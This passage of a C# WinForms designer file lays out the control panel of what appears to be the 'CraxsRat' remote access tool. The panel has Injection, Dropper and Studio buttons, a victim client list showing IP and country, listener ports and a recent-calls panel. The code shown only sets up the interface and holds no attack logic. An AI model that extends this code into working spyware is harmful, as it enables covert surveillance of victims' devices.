            this.inject_btn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.inject_btn.Font = new System.Drawing.Font("Calibri", 9F);
            this.inject_btn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.inject_btn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.inject_btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.inject_btn.Location = new System.Drawing.Point(13, 362);
            this.inject_btn.Margin = new System.Windows.Forms.Padding(4);
            this.inject_btn.Name = "inject_btn";
            this.inject_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.inject_btn.RectColor = System.Drawing.Color.Black;
            this.inject_btn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.inject_btn.RectHoverColor = System.Drawing.Color.White;
            this.inject_btn.RectPressColor = System.Drawing.Color.White;
            this.inject_btn.RectSelectedColor = System.Drawing.Color.White;
            this.inject_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
            this.inject_btn.Size = new System.Drawing.Size(165, 53);
            this.inject_btn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.inject_btn.Symbol = 61671;
            this.inject_btn.SymbolSize = 30;
            this.inject_btn.TabIndex = 130;
            this.inject_btn.Text = "Injection";
            this.inject_btn.Click += new System.EventHandler(this.inject_btn_Click);
            // 
            // drakeUILabel5
            // 
            this.drakeUILabel5.Font = new System.Drawing.Font("Bahnschrift", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel5.ForeColor = System.Drawing.Color.Lime;
            this.drakeUILabel5.Location = new System.Drawing.Point(61, 199);
            this.drakeUILabel5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel5.Name = "drakeUILabel5";
            this.drakeUILabel5.Size = new System.Drawing.Size(73, 25);
            this.drakeUILabel5.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUILabel5.TabIndex = 129;
            this.drakeUILabel5.Text = "Clients";
            this.drakeUILabel5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // Settings_btn
            // 
            this.Settings_btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Settings_btn.FillColor = System.Drawing.Color.Black;
            this.Settings_btn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.Settings_btn.FillPressColor = System.Drawing.Color.Black;
            this.Settings_btn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Settings_btn.Font = new System.Drawing.Font("Calibri", 9F);
            this.Settings_btn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Settings_btn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Settings_btn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Settings_btn.Location = new System.Drawing.Point(19, 543);
            this.Settings_btn.Margin = new System.Windows.Forms.Padding(4);
            this.Settings_btn.Name = "Settings_btn";
            this.Settings_btn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.Settings_btn.RectColor = System.Drawing.Color.Black;
            this.Settings_btn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.Settings_btn.RectHoverColor = System.Drawing.Color.White;
            this.Settings_btn.RectPressColor = System.Drawing.Color.White;
            this.Settings_btn.RectSelectedColor = System.Drawing.Color.White;
            this.Settings_btn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
            this.Settings_btn.Size = new System.Drawing.Size(152, 47);
            this.Settings_btn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Settings_btn.Symbol = 57397;
            this.Settings_btn.SymbolSize = 30;
            this.Settings_btn.TabIndex = 20;
            this.Settings_btn.Text = "Settings";
            this.Settings_btn.Click += new System.EventHandler(this.Settings_btn_Click);
            // 
            // droperbtn
            // 
            this.droperbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.droperbtn.FillColor = System.Drawing.Color.Black;
            this.droperbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.droperbtn.FillPressColor = System.Drawing.Color.Black;
            this.droperbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.droperbtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.droperbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.droperbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.droperbtn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.droperbtn.Location = new System.Drawing.Point(19, 482);
            this.droperbtn.Margin = new System.Windows.Forms.Padding(4);
            this.droperbtn.Name = "droperbtn";
            this.droperbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.droperbtn.RectColor = System.Drawing.Color.Black;
            this.droperbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.droperbtn.RectHoverColor = System.Drawing.Color.White;
            this.droperbtn.RectPressColor = System.Drawing.Color.White;
            this.droperbtn.RectSelectedColor = System.Drawing.Color.White;
            this.droperbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
            this.droperbtn.Size = new System.Drawing.Size(152, 47);
            this.droperbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.droperbtn.Symbol = 61465;
            this.droperbtn.SymbolSize = 30;
            this.droperbtn.TabIndex = 47;
            this.droperbtn.Text = "Dropper";
            this.droperbtn.Click += new System.EventHandler(this.Droperbtn_Click);
            // 
            // studiobtn
            // 
            this.studiobtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.studiobtn.FillColor = System.Drawing.Color.Black;
            this.studiobtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.studiobtn.FillPressColor = System.Drawing.Color.Black;
            this.studiobtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.studiobtn.Font = new System.Drawing.Font("Calibri", 9F);
            this.studiobtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.studiobtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.studiobtn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.studiobtn.Location = new System.Drawing.Point(19, 422);
            this.studiobtn.Margin = new System.Windows.Forms.Padding(4);
            this.studiobtn.Name = "studiobtn";
            this.studiobtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.studiobtn.RectColor = System.Drawing.Color.Black;
            this.studiobtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.studiobtn.RectHoverColor = System.Drawing.Color.White;
            this.studiobtn.RectPressColor = System.Drawing.Color.White;
            this.studiobtn.RectSelectedColor = System.Drawing.Color.White;
            this.studiobtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Left;
            this.studiobtn.Size = new System.Drawing.Size(165, 53);
            this.studiobtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.studiobtn.Symbol = 61803;
            this.studiobtn.SymbolSize = 30;
            this.studiobtn.TabIndex = 43;
            this.studiobtn.Text = "Studio";
            this.studiobtn.Click += new System.EventHandler(this.studiobtn_Click);
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.Black;
            this.pictureBox2.Image = global::Eagle_Spy_Applications.remo;
            this.pictureBox2.Location = new System.Drawing.Point(27, 27);
            this.pictureBox2.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(144, 101);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 99;
            this.pictureBox2.TabStop = false;
            // 
            // Label3
            // 
            this.Label3.BackColor = System.Drawing.Color.Black;
            this.Label3.Font = new System.Drawing.Font("Calibri", 20F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Label3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label3.Location = new System.Drawing.Point(9, 153);
            this.Label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label3.Name = "Label3";
            this.Label3.Size = new System.Drawing.Size(173, 47);
            this.Label3.TabIndex = 46;
            this.Label3.Text = "CraxsRat";
            this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // DataLog
            // 
            this.DataLog.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.DataLog.AllowUserToAddRows = false;
            this.DataLog.AllowUserToDeleteRows = false;
            this.DataLog.AllowUserToResizeColumns = false;
            this.DataLog.AllowUserToResizeRows = false;
            dataGridViewCellStyle29.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle29.ForeColor = System.Drawing.Color.Cyan;
            dataGridViewCellStyle29.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle29.SelectionForeColor = System.Drawing.Color.Black;
            this.DataLog.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle29;
            this.DataLog.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DataLog.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DataLog.BackgroundColor = System.Drawing.Color.Black;
            this.DataLog.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle30.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle30.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle30.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle30.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle30.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle30.SelectionForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle30.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataLog.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle30;
            this.DataLog.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DataLog.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.DataGridViewImageColumn2,
            this.DataGridViewTextBoxColumn5,
            this.DataGridViewTextBoxColumn4,
            this.DataGridViewTextBoxColumn7,
            this.dattim});
            this.DataLog.ContextMenuStrip = this.blockctx;
            this.DataLog.Cursor = System.Windows.Forms.Cursors.Hand;
            dataGridViewCellStyle31.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle31.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle31.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle31.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle31.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle31.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle31.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DataLog.DefaultCellStyle = dataGridViewCellStyle31;
            this.DataLog.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DataLog.EnableHeadersVisualStyles = false;
            this.DataLog.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DataLog.Location = new System.Drawing.Point(197, 87);
            this.DataLog.Margin = new System.Windows.Forms.Padding(4);
            this.DataLog.MultiSelect = false;
            this.DataLog.Name = "DataLog";
            this.DataLog.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle32.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle32.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle32.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle32.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle32.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle32.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            dataGridViewCellStyle32.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataLog.RowHeadersDefaultCellStyle = dataGridViewCellStyle32;
            this.DataLog.RowHeadersVisible = false;
            this.DataLog.RowHeadersWidth = 62;
            dataGridViewCellStyle33.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle33.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle33.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle33.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(0)))), ((int)(((byte)(10)))));
            this.DataLog.RowsDefaultCellStyle = dataGridViewCellStyle33;
            this.DataLog.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DataLog.ShowCellToolTips = false;
            this.DataLog.Size = new System.Drawing.Size(1421, 666);
            this.DataLog.TabIndex = 2;
            this.DataLog.Tag = "b";
            this.DataLog.Visible = false;
            // 
            // DataGridViewImageColumn2
            // 
            this.DataGridViewImageColumn2.HeaderText = "Flag";
            this.DataGridViewImageColumn2.MinimumWidth = 8;
            this.DataGridViewImageColumn2.Name = "DataGridViewImageColumn2";
            // 
            // DataGridViewTextBoxColumn5
            // 
            this.DataGridViewTextBoxColumn5.HeaderText = "ip";
            this.DataGridViewTextBoxColumn5.MinimumWidth = 8;
            this.DataGridViewTextBoxColumn5.Name = "DataGridViewTextBoxColumn5";
            // 
            // DataGridViewTextBoxColumn4
            // 
            this.DataGridViewTextBoxColumn4.HeaderText = "Country";
            this.DataGridViewTextBoxColumn4.MinimumWidth = 8;
            this.DataGridViewTextBoxColumn4.Name = "DataGridViewTextBoxColumn4";
            // 
            // DataGridViewTextBoxColumn7
            // 
            this.DataGridViewTextBoxColumn7.HeaderText = "ClientStatus";
            this.DataGridViewTextBoxColumn7.MinimumWidth = 8;
            this.DataGridViewTextBoxColumn7.Name = "DataGridViewTextBoxColumn7";
            // 
            // dattim
            // 
            this.dattim.HeaderText = "Date";
            this.dattim.MinimumWidth = 8;
            this.dattim.Name = "dattim";
            // 
            // connectionpanel
            // 
            this.connectionpanel.Controls.Add(this.DGVSERVS);
            this.connectionpanel.Controls.Add(this.blockpanel);
            this.connectionpanel.Controls.Add(this.infolowtext);
            this.connectionpanel.Controls.Add(this.Panel11);
            this.connectionpanel.FillColor = System.Drawing.Color.Black;
            this.connectionpanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.connectionpanel.ForeColor = System.Drawing.Color.White;
            this.connectionpanel.Location = new System.Drawing.Point(197, 87);
            this.connectionpanel.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.connectionpanel.Name = "connectionpanel";
            this.connectionpanel.RectColor = System.Drawing.Color.Black;
            this.connectionpanel.Size = new System.Drawing.Size(1421, 666);
            this.connectionpanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.connectionpanel.TabIndex = 14;
            this.connectionpanel.Text = "Connections";
            this.connectionpanel.TitleColor = System.Drawing.Color.Black;
            this.connectionpanel.TitleHeight = 0;
            // 
            // DGVSERVS
            // 
            this.DGVSERVS.AccessibleRole = System.Windows.Forms.AccessibleRole.None;
            this.DGVSERVS.AllowUserToAddRows = false;
            this.DGVSERVS.AllowUserToDeleteRows = false;
            this.DGVSERVS.AllowUserToResizeColumns = false;
            this.DGVSERVS.AllowUserToResizeRows = false;
            dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle11.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle11.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle11.SelectionForeColor = System.Drawing.Color.Lime;
            this.DGVSERVS.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle11;
            this.DGVSERVS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVSERVS.BackgroundColor = System.Drawing.Color.Black;
            this.DGVSERVS.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.DGVSERVS.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
            this.DGVSERVS.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle12.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle12.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle12.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle12.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle12.SelectionForeColor = System.Drawing.Color.Lime;
            dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVSERVS.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle12;
            this.DGVSERVS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGVSERVS.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Start,
            this.portnam,
            this.DataGridViewTextBoxColumn6,
            this.Key});
            this.DGVSERVS.Cursor = System.Windows.Forms.Cursors.Hand;
            dataGridViewCellStyle13.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle13.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle13.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle13.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle13.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle13.SelectionForeColor = System.Drawing.Color.Lime;
            dataGridViewCellStyle13.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGVSERVS.DefaultCellStyle = dataGridViewCellStyle13;
            this.DGVSERVS.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DGVSERVS.EnableHeadersVisualStyles = false;
            this.DGVSERVS.GridColor = System.Drawing.Color.White;
            this.DGVSERVS.Location = new System.Drawing.Point(0, 58);
            this.DGVSERVS.Margin = new System.Windows.Forms.Padding(3, 1, 3, 1);
            this.DGVSERVS.MultiSelect = false;
            this.DGVSERVS.Name = "DGVSERVS";
            this.DGVSERVS.ReadOnly = true;
            this.DGVSERVS.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle14.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle14.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle14.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.Lime;
            dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVSERVS.RowHeadersDefaultCellStyle = dataGridViewCellStyle14;
            this.DGVSERVS.RowHeadersVisible = false;
            this.DGVSERVS.RowHeadersWidth = 40;
            dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle15.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle15.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle15.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle15.SelectionForeColor = System.Drawing.Color.Lime;
            this.DGVSERVS.RowsDefaultCellStyle = dataGridViewCellStyle15;
            this.DGVSERVS.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.DGVSERVS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGVSERVS.ShowCellToolTips = false;
            this.DGVSERVS.Size = new System.Drawing.Size(1421, 610);
            this.DGVSERVS.TabIndex = 3;
            this.DGVSERVS.Tag = "b";
            this.DGVSERVS.CellClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.DGVSERVS_CellClick);
            // 
            // Start
            // 
            this.Start.HeaderText = "Start/Stop";
            this.Start.MinimumWidth = 10;
            this.Start.Name = "Start";
            this.Start.ReadOnly = true;
            this.Start.Resizable = System.Windows.Forms.DataGridViewTriState.True;
            this.Start.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Automatic;
            this.Start.Width = 75;
            // 
            // portnam
            // 
            this.portnam.FillWeight = 149.4738F;
            this.portnam.HeaderText = "Port";
            this.portnam.MinimumWidth = 8;
            this.portnam.Name = "portnam";
            this.portnam.ReadOnly = true;
            this.portnam.Width = 200;
            // 
            // DataGridViewTextBoxColumn6
            // 
            this.DataGridViewTextBoxColumn6.FillWeight = 122.6465F;
            this.DataGridViewTextBoxColumn6.HeaderText = "Status";
            this.DataGridViewTextBoxColumn6.MinimumWidth = 8;
            this.DataGridViewTextBoxColumn6.Name = "DataGridViewTextBoxColumn6";
            this.DataGridViewTextBoxColumn6.ReadOnly = true;
            this.DataGridViewTextBoxColumn6.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            this.DataGridViewTextBoxColumn6.Width = 200;
            // 
            // Key
            // 
            this.Key.HeaderText = "KEY";
            this.Key.MinimumWidth = 10;
            this.Key.Name = "Key";
            this.Key.ReadOnly = true;
            this.Key.Width = 120;
            // 
            // blockpanel
            // 
            this.blockpanel.Controls.Add(this.notificationspanel);
            this.blockpanel.Controls.Add(this.Panel9);
            this.blockpanel.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(225)))), ((int)(((byte)(245)))), ((int)(((byte)(254)))));
            this.blockpanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.blockpanel.ForeColor = System.Drawing.Color.White;
            this.blockpanel.Location = new System.Drawing.Point(2259, 180);
            this.blockpanel.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.blockpanel.Name = "blockpanel";
            this.blockpanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.blockpanel.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.blockpanel.Size = new System.Drawing.Size(133, 236);
            this.blockpanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.blockpanel.TabIndex = 15;
            this.blockpanel.Text = "Blocked Clients";
            this.blockpanel.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.blockpanel.TitleHeight = 0;
            // 
            // notificationspanel
            // 
            this.notificationspanel.BackColor = System.Drawing.Color.Black;
            this.notificationspanel.Controls.Add(this.callspanel);
            this.notificationspanel.Controls.Add(this.activityzpanel);
            this.notificationspanel.Controls.Add(this.Panel12);
            this.notificationspanel.Location = new System.Drawing.Point(2208, 162);
            this.notificationspanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.notificationspanel.Name = "notificationspanel";
            this.notificationspanel.Size = new System.Drawing.Size(187, 108);
            this.notificationspanel.TabIndex = 4;
            // 
            // callspanel
            // 
            this.callspanel.Controls.Add(this.DGVCALLS);
            this.callspanel.FillColor = System.Drawing.Color.Black;
            this.callspanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.callspanel.ForeColor = System.Drawing.Color.White;
            this.callspanel.Location = new System.Drawing.Point(1997, 132);
            this.callspanel.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.callspanel.Name = "callspanel";
            this.callspanel.Padding = new System.Windows.Forms.Padding(0, 34, 0, 0);
            this.callspanel.Radius = 55;
            this.callspanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.callspanel.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.callspanel.Size = new System.Drawing.Size(372, 207);
            this.callspanel.Style = DrakeUI.Framework.UIStyle.Custom;
            this.callspanel.StyleCustomMode = true;
            this.callspanel.TabIndex = 2;
            this.callspanel.Text = "Recent Calls";
            this.callspanel.TitleColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            // 
            // DGVCALLS
            // 
            this.DGVCALLS.AllowUserToAddRows = false;
            this.DGVCALLS.AllowUserToDeleteRows = false;
            this.DGVCALLS.AllowUserToResizeColumns = false;
            this.DGVCALLS.AllowUserToResizeRows = false;
            this.DGVCALLS.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGVCALLS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVCALLS.BackgroundColor = System.Drawing.Color.Black;
            this.DGVCALLS.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.DGVCALLS.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.DGVCALLS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGVCALLS.ColumnHeadersVisible = false;
            this.DGVCALLS.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.DataGridViewImageColumn3,
            this.DataGridViewTextBoxColumn2});
            dataGridViewCellStyle16.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle16.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle16.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle16.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle16.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            dataGridViewCellStyle16.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle16.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGVCALLS.DefaultCellStyle = dataGridViewCellStyle16;
            this.DGVCALLS.EnableHeadersVisualStyles = false;
            this.DGVCALLS.Location = new System.Drawing.Point(1661, 123);
            this.DGVCALLS.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.DGVCALLS.Name = "DGVCALLS";
            this.DGVCALLS.ReadOnly = true;
            this.DGVCALLS.RowHeadersVisible = false;
            this.DGVCALLS.RowHeadersWidth = 62;
            this.DGVCALLS.RowTemplate.Height = 24;
            this.DGVCALLS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGVCALLS.Size = new System.Drawing.Size(220, 176);
            this.DGVCALLS.TabIndex = 1;
            // 
            // DataGridViewImageColumn3
            // 
            this.DataGridViewImageColumn3.FillWeight = 33.12183F;
            this.DataGridViewImageColumn3.HeaderText = "image";
            this.DataGridViewImageColumn3.MinimumWidth = 8;
            this.DataGridViewImageColumn3.Name = "DataGridViewImageColumn3";
            this.DataGridViewImageColumn3.ReadOnly = true;
            // 
            // DataGridViewTextBoxColumn2
            // 
            this.DataGridViewTextBoxColumn2.FillWeight = 111.8782F;
            this.DataGridViewTextBoxColumn2.HeaderText = "notifi";
            this.DataGridViewTextBoxColumn2.MinimumWidth = 8;
            this.DataGridViewTextBoxColumn2.Name = "DataGridViewTextBoxColumn2";
            this.DataGridViewTextBoxColumn2.ReadOnly = true;
            // 
            // activityzpanel
